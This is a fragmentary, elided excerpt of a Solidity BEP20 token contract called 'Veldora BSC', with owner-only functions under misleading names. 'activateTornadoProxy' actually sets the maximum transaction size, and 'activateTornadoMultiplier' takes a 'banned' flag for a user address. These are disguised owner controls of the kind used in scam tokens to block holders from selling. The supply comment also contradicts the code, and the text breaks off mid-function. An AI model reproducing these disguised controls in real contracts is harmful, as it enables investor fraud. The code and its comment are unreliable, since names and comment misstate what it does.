...
contract VeldoraBSC is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "Veldora BSC";
    string constant _symbol = "VBSC";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 10000000000000  * (10 ** _decimals); // 1,000,000,000,000,000
    ...
    function activateTornadoProxy(uint256 amount) external authorized {
        _maxTxAmount = amount;
	...
	function activateTornadoMultiplier(address user, bool banned) external authorized {
		if (banned) {
